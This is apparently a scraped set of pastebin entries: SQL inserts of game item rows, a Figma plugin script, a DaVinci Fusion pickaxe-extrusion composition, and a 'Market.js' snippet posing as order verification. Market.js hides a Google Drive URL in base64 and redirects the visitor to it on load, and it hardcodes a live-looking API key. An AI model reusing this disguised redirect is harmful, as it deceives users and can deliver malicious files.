(164817, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164822, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(164824, 2, 1799, 'Y', 000, '5194,5141,1527,5420,4786', 0, 56),
(164828, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164833, 2, 1799, 'Y', 000, '5194,5141,1527,5421,4786', 0, 56),
(164836, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(164839, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164843, 2, 1799, 'Y', 000, '5194,5142,1527,5419,4786', 0, 56),
(164844, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164845, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(164846, 2, 1799, 'Y', 000, '5194,5142,1527,5420,4786', 0, 56),
(164847, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164848, 2, 1799, 'Y', 000, '5194,5142,1527,5421,4786', 0, 56),
(164849, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(164850, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164876, 2, 1799, 'Y', 000, '5194,5141,1527,5419,4786', 0, 56),
(164881, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(164886, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164888, 2, 1799, 'Y', 000, '5194,5142,1527,5420,4786', 0, 56),
(164892, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164897, 2, 1799, 'Y', 000, '5194,5142,1527,5421,4786', 0, 56),
(164900, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164903, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(165032, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(165035, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(165042, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(165044, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(165045, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(165046, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(165047, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(165048, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(165049, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(165050, 2, 1799, 'Y', 000, '5193,4802,5141,1522,4786', 0, 56),
(165051, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(165052, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(165053, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(165054, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(165055, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(165056, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(165057, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(165058, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(165806, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(165807, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(166590, 2, 1799, 'Y', 000, '5194,5141,1527,5420,4786', 0, 56),
(166595, 2, 1799, 'Y', 000, '5194,5141,1527,5420,4786', 0, 56),
(166598, 2, 1799, 'Y', 000, '5194,5141,1527,5420,4786', 0, 56),
(166603, 2, 1799, 'Y', 000, '5194,5142,1527,5420,4786', 0, 56),
(166614, 2, 1799, 'Y', 000, '5194,5141,1527,5419,4786', 0, 56),
(166618, 2, 1799, 'Y', 000, '5194,5141,1527,5419,4786', 0, 56),
(166622, 2, 1799, 'Y', 000, '5194,5142,1527,5419,4786', 0, 56),
(166626, 2, 1799, 'Y', 000, '5194,5142,1527,5419,4786', 0, 56),
(166638, 2, 1799, 'Y', 000, '5194,5141,1527,5421,4786', 0, 56),
(166644, 2, 1799, 'Y', 000, '5194,5141,1527,5421,4786', 0, 56),
(166646, 2, 1799, 'Y', 000, '5194,5141,1527,5421,4786', 0, 56),
(166652, 2, 1799, 'Y', 000, '5194,5142,1527,5421,4786', 0, 56),
(166813, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164803, 2, 1799, 'Y', 000, '5194,5142,1527,5420,4786', 0, 56),
(164804, 2, 1799, 'Y', 000, '5194,5142,1527,5419,4786', 0, 56),
(164805, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(164806, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164807, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164808, 2, 1799, 'Y', 000, '5194,5141,1527,5421,4786', 0, 56),
(164809, 2, 1799, 'Y', 000, '5193,41,5141,1522,4786', 0, 56),
(164810, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164811, 2, 1799, 'Y', 000, '5194,5141,1527,5420,4786', 0, 56),
(164813, 2, 1799, 'Y', 000, '5194,5141,1527,5419,4786', 0, 56),
(164816, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164821, 2, 1799, 'Y', 000, '5193,43,5142,1522,4786', 0, 56),
(164827, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(164832, 2, 1799, 'Y', 000, '5194,5142,1527,5421,4786', 0, 56),
(164835, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(164840, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164867, 2, 1799, 'Y', 000, '5194,5142,1527,5420,4786', 0, 56),
(164868, 2, 1799, 'Y', 000, '5194,5142,1527,5419,4786', 0, 56),
(164869, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(164870, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(164871, 2, 1799, 'Y', 000, '5193,4802,40,5142,1522,4786', 0, 56),
(164872, 2, 1799, 'Y', 000, '5194,5142,1527,5421,4786', 0, 56),
(164873, 2, 1799, 'Y', 000, '5193,42,5142,1522,4786', 0, 56),
(164874, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164875, 2, 1799, 'Y', 000, '5194,5141,1527,5420,4786', 0, 56),
(164877, 2, 1799, 'Y', 000, '5194,5142,1527,5419,4786', 0, 56),
(164880, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(164885, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(164891, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(164896, 2, 1799, 'Y', 000, '5194,5142,1527,5421,4786', 0, 56),
(164899, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(164904, 2, 1799, 'Y', 000, '5193,4802,5142,1522,4786', 0, 56),
(165025, 2, 1799, 'Y', 000, '5193,41,5141,1522,4786', 0, 56),
(165033, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(165034, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(166477, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(166593, 2, 1799, 'Y', 000, '5194,5142,1527,5420,4786', 0, 56),
(166594, 2, 1799, 'Y', 000, '5194,5142,1527,5420,4786', 0, 56),
(166601, 2, 1799, 'Y', 000, '5194,5142,1527,5420,4786', 0, 56),
(166602, 2, 1799, 'Y', 000, '5194,5142,1527,5420,4786', 0, 56),
(166617, 2, 1799, 'Y', 000, '5194,5141,1527,5419,4786', 0, 56),
(166619, 2, 1799, 'Y', 000, '5194,5141,1527,5419,4786', 0, 56),
(166625, 2, 1799, 'Y', 000, '5194,5141,1527,5419,4786', 0, 56),
(166627, 2, 1799, 'Y', 000, '5194,5141,1527,5419,4786', 0, 56),
(166641, 2, 1799, 'Y', 000, '5194,5141,1527,5421,4786', 0, 56),
(166643, 2, 1799, 'Y', 000, '5194,5141,1527,5421,4786', 0, 56),
(166649, 2, 1799, 'Y', 000, '5194,5141,1527,5421,4786', 0, 56),
(166651, 2, 1799, 'Y', 000, '5194,5141,1527,5421,4786', 0, 56),
(165027, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(165041, 2, 1799, 'Y', 000, '5193,4802,5142,1522,4786', 0, 56),
(166900, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(166901, 2, 1799, 'Y', 000, '5193,40,5142,1522,4786', 0, 56),
(165030, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(165036, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(166479, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164787, 2, 1799, 'Y', 000, '5194,5141,1527,5419,4786', 0, 56),
(164788, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164789, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164790, 2, 1799, 'Y', 000, '5194,5141,1527,5420,4786', 0, 56),
(164791, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164792, 2, 1799, 'Y', 000, '5194,5141,1527,5421,4786', 0, 56),
(164793, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(164794, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164815, 2, 1799, 'Y', 000, '5194,5142,1527,5419,4786', 0, 56),
(164819, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(164820, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(164826, 2, 1799, 'Y', 000, '5194,5141,1527,5420,4786', 0, 56),
(164830, 2, 1799, 'Y', 000, '5193,43,5141,1522,4786', 0, 56),
(164831, 2, 1799, 'Y', 000, '5194,5141,1527,5421,4786', 0, 56),
(164838, 2, 1799, 'Y', 000, '5193,4802,5142,1522,4786', 0, 56),
(164842, 2, 1799, 'Y', 000, '5193,4802,5142,1522,4786', 0, 56),
(164851, 2, 1799, 'Y', 000, '5194,5141,1527,5419,4786', 0, 56),
(164852, 2, 1799, 'Y', 000, '5193,4802,5142,1522,4786', 0, 56),
(164853, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164854, 2, 1799, 'Y', 000, '5194,5141,1527,5420,4786', 0, 56),
(164855, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164856, 2, 1799, 'Y', 000, '5194,5141,1527,5421,4786', 0, 56),
(164857, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(164858, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(164879, 2, 1799, 'Y', 000, '5194,5142,1527,5419,4786', 0, 56),
(164883, 2, 1799, 'Y', 000, '5193,4802,5141,1522,4786', 0, 56),
(164884, 2, 1799, 'Y', 000, '5193,43,5141,1522,4786', 0, 56),
(164890, 2, 1799, 'Y', 000, '5194,5141,1527,5420,4786', 0, 56),
(164894, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164895, 2, 1799, 'Y', 000, '5194,5141,1527,5421,4786', 0, 56),
(164902, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164906, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(166591, 2, 1799, 'Y', 000, '5194,5142,1527,5420,4786', 0, 56),
(166597, 2, 1799, 'Y', 000, '5194,5142,1527,5420,4786', 0, 56),
(166599, 2, 1799, 'Y', 000, '5194,5142,1527,5420,4786', 0, 56),
(166605, 2, 1799, 'Y', 000, '5194,5142,1527,5420,4786', 0, 56),
(166615, 2, 1799, 'Y', 000, '5194,5142,1527,5419,4786', 0, 56),
(166621, 2, 1799, 'Y', 000, '5194,5141,1527,5419,4786', 0, 56),
(166623, 2, 1799, 'Y', 000, '5194,5142,1527,5419,4786', 0, 56),
(166629, 2, 1799, 'Y', 000, '5194,5141,1527,5419,4786', 0, 56),
(166639, 2, 1799, 'Y', 000, '5194,5142,1527,5421,4786', 0, 56),
(166642, 2, 1799, 'Y', 000, '5194,5141,1527,5421,4786', 0, 56),
(166647, 2, 1799, 'Y', 000, '5194,5142,1527,5421,4786', 0, 56),
(166650, 2, 1799, 'Y', 000, '5194,5141,1527,5421,4786', 0, 56),
(165031, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(165037, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164795, 2, 1799, 'Y', 000, '5194,5142,1527,5419,4786', 0, 56),
(164796, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(164797, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164798, 2, 1799, 'Y', 000, '5194,5142,1527,5420,4786', 0, 56),
(164799, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(164800, 2, 1799, 'Y', 000, '5194,5142,1527,5421,4786', 0, 56),
(164801, 2, 1799, 'Y', 000, '5193,41,5142,1522,4786', 0, 56),
(164802, 2, 1799, 'Y', 000, '5193,40,5141,1522,4786', 0, 56),
(164814, 2, 1799, 'Y', 000, '5194,5142,1527,5419,4786', 0, 56),
(164818, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164823, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(164825, 2, 1799, 'Y', 000, '5194,5142,1527,5420,4786', 0, 56),
(164829, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(164834, 2, 1799, 'Y', 000, '5194,5142,1527,5421,4786', 0, 56),
(164837, 2, 1799, 'Y', 000, '5193,4802,5141,1522,4786', 0, 56),
(164841, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164859, 2, 1799, 'Y', 000, '5194,5142,1527,5419,4786', 0, 56),
(164860, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164861, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164862, 2, 1799, 'Y', 000, '5194,5142,1527,5420,4786', 0, 56),
(164863, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(164864, 2, 1799, 'Y', 000, '5194,5141,1527,5421,4786', 0, 56),
(164865, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164866, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(164878, 2, 1799, 'Y', 000, '5194,5142,1527,5419,4786', 0, 56),
(164882, 2, 1799, 'Y', 000, '5193,4802,5142,1522,4786', 0, 56),
(164887, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(164889, 2, 1799, 'Y', 000, '5194,5141,1527,5420,4786', 0, 56),
(164893, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(164898, 2, 1799, 'Y', 000, '5194,5142,1527,5421,4786', 0, 56),
(164901, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(164905, 2, 1799, 'Y', 000, '5193,42,5142,1522,4786', 0, 56),
(165024, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(165043, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(166592, 2, 1799, 'Y', 000, '5194,5141,1527,5420,4786', 0, 56),
(166596, 2, 1799, 'Y', 000, '5194,5142,1527,5420,4786', 0, 56),
(166600, 2, 1799, 'Y', 000, '5194,5141,1527,5420,4786', 0, 56),
(166604, 2, 1799, 'Y', 000, '5194,5142,1527,5420,4786', 0, 56),
(166616, 2, 1799, 'Y', 000, '5194,5142,1527,5419,4786', 0, 56),
(166620, 2, 1799, 'Y', 000, '5194,5142,1527,5419,4786', 0, 56),
(166624, 2, 1799, 'Y', 000, '5194,5141,1527,5419,4786', 0, 56),
(166628, 2, 1799, 'Y', 000, '5194,5142,1527,5419,4786', 0, 56),
(166640, 2, 1799, 'Y', 000, '5194,5142,1527,5421,4786', 0, 56),
(166645, 2, 1799, 'Y', 000, '5194,5141,1527,5421,4786', 0, 56),
(166648, 2, 1799, 'Y', 000, '5194,5142,1527,5421,4786', 0, 56),
(166653, 2, 1799, 'Y', 000, '5194,5141,1527,5421,4786', 0, 56),
(165029, 2, 1799, 'Y', 000, '5193,4802,5142,1522,4786', 0, 56),
(165038, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(165026, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(165040, 2, 1799, 'Y', 000, '5193,5142,1522,4786', 0, 56),
(165028, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
(165039, 2, 1799, 'Y', 000, '5193,5141,1522,4786', 0, 56),
-- ГШ МИФ 420-425 - 1825 - 6 контекст
(167838, 2, 1820, 'Y', 000, '4800,1542,4786', 0, 6),
(167833, 2, 1820, 'Y', 000, '4800,1542,5850,4783', 0, 6),
(167841, 2, 1820, 'Y', 000, '4800,1542,4786', 0, 6),
(167218, 2, 1820, 'Y', 000, '4800,42,1542,5850,4783', 0, 6),
(167863, 2, 1820, 'Y', 000, '4800,1542,5850,4783', 0, 6),
(167840, 2, 1820, 'Y', 000, '4800,1542,4786', 0, 6),
(167837, 2, 1820, 'Y', 000, '4800,1808,1542,5850,4783', 0, 6),
(167219, 2, 1820, 'Y', 000, '4800,1542,4786', 0, 6),
(167842, 2, 1820, 'Y', 000, '4800,1542,4786', 0, 6),
(167217, 2, 1820, 'Y', 000, '4800,41,1547,4786', 0, 6),
(167834, 2, 1820, 'Y', 000, '4800,1547,4786', 0, 6),
(167839, 2, 1820, 'Y', 000, '4800,1547,4786', 0, 6),
(167867, 2, 1820, 'Y', 000, '4800,1547,4786', 0, 6),
(167864, 2, 1820, 'Y', 000, '4800,1547,4786', 0, 6),
(167865, 2, 1820, 'Y', 000, '4800,1547,4786', 0, 6),
(167868, 2, 1820, 'Y', 000, '4800,1547,4786', 0, 6),
(167835, 2, 1820, 'Y', 000, '4800,1547,4786', 0, 6),
(167866, 2, 1820, 'Y', 000, '4800,1547,4786', 0, 6),
-- ОТ ИГРОКОВ
(147060, 2, 125, 'Y', 000, '3563,1498,3528', 0, 6),
(152145, 2, 125, 'Y', 000, '3612,1502,3528', 0, 6),
(151991, 2, 125, 'Y', 000, '3612,1502,3528', 0, 6),
(152144, 2, 125, 'Y', 000, '3612,1502,3528', 0, 6),
(151984, 2, 125, 'Y', 000, '3612,1502,3528', 0, 6),
(152143, 2, 125, 'Y', 000, '3612,1502,3528', 0, 6),
(152146, 2, 125, 'Y', 000, '3612,1502,3528', 0, 6),
(152413, 2, 125, 'Y', 000, '3612,1502,3528', 0, 6),
(152147, 2, 125, 'Y', 000, '3612,1502,3528', 0, 6),
(152142, 2, 125, 'Y', 000, '3612,1502,3528', 0, 6),
(151982, 2, 125, 'Y', 000, '3612,1502,3528', 0, 6),
(151981, 2, 125, 'Y', 000, '3612,1502,3528', 0, 6),
(36942, 2, 250, 'Y', 000, '0', 0, 0),
(90064, 2, 125, 'Y', 000, '0', 0, 0),
(90061, 2, 125, 'Y', 000, '0', 0, 0),
(90065, 2, 125, 'Y', 000, '0', 0, 0),
(90062, 2, 125, 'Y', 000, '0', 0, 0);"
93Z7gmpW,Market.js,Ratqueenkslskskwkw,JavaScript,Wednesday 9th of April 2025 05:03:15 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/30390/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
igzVnUAb,Untitled,loginblogin,TypeScript,Wednesday 9th of April 2025 04:59:08 AM CDT,"const selection = figma.currentPage.selection;

if (selection.length === 0 || selection[0].type !== ""TEXT"") {
  figma.notify(""Выберите текстовый слой"");
} else {
  const textNode = selection[0] as TextNode;

  // Загружаем шрифт первого символа
  await figma.loadFontAsync(textNode.getRangeFontName(0, 1) as FontName);

  const styleId = textNode.getRangeTextStyleId(0, 1);

  if (styleId && styleId !== figma.mixed && styleId !== """") {
    try {
      const style = await figma.getStyleByIdAsync(styleId as string);

      if (style) {
        const savedStyle = {
          type: ""style"",
          id: style.id,
          name: style.name,
        };
        console.log(""Сохранён стиль:"", savedStyle);
      } else {
        figma.notify(""Стиль не найден"");
      }
    } catch (error) {
      console.error(""Ошибка при получении стиля:"", error);
      figma.notify(""Не удалось получить стиль"");
    }
  } else {
    const fontName = textNode.getRangeFontName(0, 1) as FontName;
    const fontSize = textNode.getRangeFontSize(0, 1) as number;

    const savedFont = {
      type: ""custom"",
      fontName,
      fontSize,
    };
    console.log(""Сохранён шрифт и размер:"", savedFont);
  }
}
"
4ptu9kVQ,Minecraft Diamond Pickaxe extrusion,marcusa3000,Lua,Wednesday 9th of April 2025 04:56:19 AM CDT,"{
	Tools = ordered() {
		Duplicate1 = Fuse.Duplicate {
			Inputs = {
				Copies = Input { Value = 4, },
				Center = Input { Value = { 0.475, 0.5 }, },
				Operator = Input { Value = FuID { ""Under"" }, },
				Polyline = Input {
					Value = Polyline {
					},
				},
				Background = Input {
					SourceOp = ""Crop1_3_1"",
					Source = ""Output"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { -2860, 1666.5 } },
		},
		Duplicate1_1 = Fuse.Duplicate {
			Inputs = {
				Copies = Input { Value = 4, },
				Center = Input { Value = { 0.525, 0.5 }, },
				Operator = Input { Value = FuID { ""Under"" }, },
				Polyline = Input {
					Value = Polyline {
					},
				},
				Background = Input {
					SourceOp = ""Duplicate1"",
					Source = ""Output"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { -2860, 1699.5 } },
		},
		ConnectPickaxeToMe = Scale {
			NameSet = true,
			Inputs = {
				XSize = Input { Value = 0.1, },
				HiQOnly = Input { Value = 0, },
				PixelAspect = Input { Value = { 1, 1 }, },
				FilterMethod = Input { Value = 0, }
			},
			ViewInfo = OperatorInfo { Pos = { -2915, 1567.5 } },
		},
		Crop1_3_1 = Crop {
			NameSet = true,
			Inputs = {
				XOffset = Input { Value = 2, },
				YOffset = Input { Value = 1, },
				XSize = Input { Value = 13, },
				YSize = Input { Value = 13, },
				Input = Input {
					SourceOp = ""ConnectPickaxeToMe"",
					Source = ""Output"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { -2915, 1600.5 } },
			UserControls = ordered() {
				Separator1 = {
					ICS_ControlPage = ""Crop"",
					INPID_InputControl = ""SeparatorControl"",
				},
				ExportInvertedCrop = {
					INP_Integer = false,
					LINKID_DataType = ""Number"",
					IC_NoLabel = true,
					BTNCS_Execute = ""						comp:StartUndo('Export Inverted Crop');\n						crop = comp.ActiveTool;\n						newcrop = comp:AddTool(\""Crop\"", -32768, -32768);\n						newcrop.XOffset:SetExpression(\""-\""..crop:GetAttrs().TOOLS_Name..\"".XOffset\"");\n						newcrop.YOffset:SetExpression(\""-\""..crop:GetAttrs().TOOLS_Name..\"".YOffset\"");\n						newcrop.XSize:SetExpression(crop:GetAttrs().TOOLS_Name..\"".Input.OriginalWidth\"");\n						newcrop.YSize:SetExpression(crop:GetAttrs().TOOLS_Name..\"".Input.OriginalHeight\"");\n						newcrop.ClippingMode = \""None\"";\n						newcrop:SetAttrs({ TOOLS_Name = crop:GetAttrs().TOOLS_Name..\""_Inverted\"" });\n						comp:EndUndo();\n						"",
					INPID_InputControl = ""ButtonControl"",
					ICS_ControlPage = ""Crop"",
					LINKS_Name = ""Export Inverted Crop"",
				},
				Separator2 = {
					ICS_ControlPage = ""Crop"",
					INPID_InputControl = ""SeparatorControl"",
				},
				Red = {
					{ MBTNC_AddButton = ""Red"" },
					INPID_InputControl = ""MultiButtonControl"",
					MBTNC_ShowBasicButton = true,
					INP_Default = 1,
					MBTNC_Type = ""Toggle"",
					INP_External = false,
					LINKID_DataType = ""Number"",
					IC_NoLabel = true,
					MBTNC_StretchToFit = true,
					ICS_ControlPage = ""Crop"",
					LINKS_Name = ""Red"",
				},
				Green = {
					{ MBTNC_AddButton = ""Green"" },
					INPID_InputControl = ""MultiButtonControl"",
					MBTNC_ShowBasicButton = true,
					INP_Default = 1,
					MBTNC_Type = ""Toggle"",
					INP_External = false,
					LINKID_DataType = ""Number"",
					IC_NoLabel = true,
					MBTNC_StretchToFit = true,
					ICS_ControlPage = ""Crop"",
					LINKS_Name = ""Green"",
				},
				Blue = {
					{ MBTNC_AddButton = ""Blue"" },
					INPID_InputControl = ""MultiButtonControl"",
					MBTNC_ShowBasicButton = true,
					INP_Default = 1,
					MBTNC_Type = ""Toggle"",
					INP_External = false,
					LINKID_DataType = ""Number"",
					IC_NoLabel = true,
					MBTNC_StretchToFit = true,
					ICS_ControlPage = ""Crop"",
					LINKS_Name = ""Blue"",
				},
				Alpha = {
					{ MBTNC_AddButton = ""Alpha"" },
					INPID_InputControl = ""MultiButtonControl"",
					MBTNC_ShowBasicButton = true,
					INP_Default = 1,
					MBTNC_Type = ""Toggle"",
					INP_External = false,
					LINKID_DataType = ""Number"",
					IC_NoLabel = true,
					MBTNC_StretchToFit = true,
					ICS_ControlPage = ""Crop"",
					LINKS_Name = ""Alpha"",
				},
				Spacer = {
					ICS_ControlPage = ""Crop"",
					INPID_InputControl = ""SpacerControl"",
				},
				AutoCrop = {
					INP_MaxAllowed = 1000000,
					INP_Integer = false,
					INPID_InputControl = ""ButtonControl"",
					INP_MaxScale = 1,
					LINKID_DataType = ""Number"",
					INP_MinScale = 0,
					INP_MinAllowed = -1000000,
					IC_NoLabel = true,
					ICS_ControlPage = ""Crop"",
					INP_Passive = true,
					INP_External = false,
					LINKS_Name = ""Auto Crop""
				}
			}
		},
		Merge22 = Merge {
			Inputs = {
				Background = Input {
					SourceOp = ""Duplicate1_2_1"",
					Source = ""Output"",
				},
				Foreground = Input {
					SourceOp = ""Duplicate1_1"",
					Source = ""Output"",
				},
				PerformDepthMerge = Input { Value = 0, }
			},
			ViewInfo = OperatorInfo { Pos = { -2970, 1765.5 } },
		},
		Duplicate1_2 = Fuse.Duplicate {
			Inputs = {
				Copies = Input { Value = 4, },
				Center = Input { Value = { 0.5, 0.475 }, },
				Operator = Input { Value = FuID { ""Under"" }, },
				Polyline = Input {
					Value = Polyline {
					},
				},
				Background = Input {
					SourceOp = ""Crop1_3_1"",
					Source = ""Output"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { -2970, 1666.5 } },
		},
		Duplicate1_2_1 = Fuse.Duplicate {
			Inputs = {
				Copies = Input { Value = 4, },
				Center = Input { Value = { 0.5, 0.525 }, },
				Operator = Input { Value = FuID { ""Under"" }, },
				Polyline = Input {
					Value = Polyline {
					},
				},
				Background = Input {
					SourceOp = ""Duplicate1_2"",
					Source = ""Output"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { -2970, 1699.5 } },
		},
		CleanPlate1_2 = CleanPLate {
			Inputs = {
				Method = Input { Value = FuID { ""Ranges"" }, },
				InsideFill = Input { Value = 1, },
				HoldTime = Input { Value = 181, },
				Input = Input {
					SourceOp = ""Merge22"",
					Source = ""Output"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { -2970, 1798.5 } },
		},
		Scale3_2_1 = Scale {
			Inputs = {
				XSize = Input { Value = 100, },
				HiQOnly = Input { Value = 0, },
				PixelAspect = Input { Value = { 1, 1 }, },
				FilterMethod = Input { Value = 0, },
				Input = Input {
					SourceOp = ""CleanPlate1_2"",
					Source = ""Output"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { -2970, 1831.5 } },
		},
		Transform26_15 = Transform {
			Inputs = {
				Quality = Input { Value = 5, },
				Size = Input { Value = 0.999, },
				Edges = Input { Value = 2, },
				Input = Input {
					SourceOp = ""Scale3_2_1"",
					Source = ""Output"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { -2970, 1864.5 } },
		},
		Transform3D1_1 = Transform3D {
			Inputs = {
				SceneInput = Input {
					SourceOp = ""Extrude3D1_1"",
					Source = ""Output"",
				},
				[""Transform3DOp.Rotate.X""] = Input {
					Value = -84,
					Expression = ""-time*1.5"",
				},
				[""Transform3DOp.Rotate.Y""] = Input {
					Value = 84,
					Expression = ""time*1.5"",
				},
				[""Transform3DOp.Rotate.Z""] = Input {
					Value = 28,
					Expression = ""time/2"",
				}
			},
			ViewInfo = OperatorInfo { Pos = { -2970, 1930.5 } },
		},
		Extrude3D1_1 = Extrude3D {
			Inputs = {
				[""Transform3DOp.Translate.Z""] = Input {
					Value = -0.05,
					Expression = ""-ExtrusionDepth/2"",
				},
				ShapeInput = Input {
					SourceOp = ""sPolygon2"",
					Source = ""Output"",
				},
				MaterialInput = Input {
					SourceOp = ""Transform26_15"",
					Source = ""Output"",
				},
				ExtrusionProfile = Input {
					SourceOp = ""Extrude3D1_1ExtrusionProfile"",
